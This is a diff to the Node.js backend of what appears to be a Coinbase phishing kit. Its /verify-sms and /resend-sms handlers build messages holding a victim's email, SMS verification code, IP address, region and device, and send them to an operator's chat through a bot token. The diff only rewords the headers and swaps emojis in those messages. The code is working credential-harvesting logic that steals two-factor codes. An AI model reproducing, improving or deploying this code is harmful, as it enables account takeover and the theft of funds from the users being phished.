@@ -548,13 +548,13 @@ app.post("/verify-sms", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `😈😈😈😈 <b>SMS - Coinbase</b> 😈😈😈😈\n` +
+      `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
       `<b>📱 SMS:</b> <code>${smsCode}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
-      `<b>📡 IP:</b> ${ip}`;
+      `<b>📍 IP:</b> ${ip}`;
 
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
@@ -614,12 +614,12 @@ app.post("/resend-sms", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `😈😈😈 <b>Resend SMS - Coinbase</b> 😈😈😈\n` +
+      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
-      `<b>📡 IP:</b> ${ip}`;
+      `<b>📍 IP:</b> ${ip}`;
 
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
